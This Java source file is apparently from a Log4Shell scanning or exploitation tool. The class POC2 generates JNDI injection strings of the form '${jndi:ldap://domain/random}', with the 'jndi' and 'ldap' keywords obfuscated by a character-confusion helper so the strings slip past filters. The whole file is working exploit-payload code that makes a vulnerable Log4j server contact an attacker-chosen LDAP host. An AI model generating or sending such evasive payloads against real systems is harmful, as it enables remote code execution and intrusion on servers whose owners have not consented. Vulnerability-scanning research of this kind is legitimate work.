package cn.xxx.poc.impl;

import cn.xxx.poc.IPOC;
import cn.xxx.utils.Utils;

import static cn.xxx.utils.Utils.confusionChars;

public class POC2 implements IPOC {
    private String confusion() {
        StringBuilder result = new StringBuilder();
        result.append(confusionChars(new String[]{"j", "n", "d", "i"}));
        result.append(":");
        result.append(confusionChars(new String[]{"l", "d", "a", "p"}));
        return result.toString();
    }

    @Override
    public String generate(String domain) {
        return "${" + confusion() + "://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }
}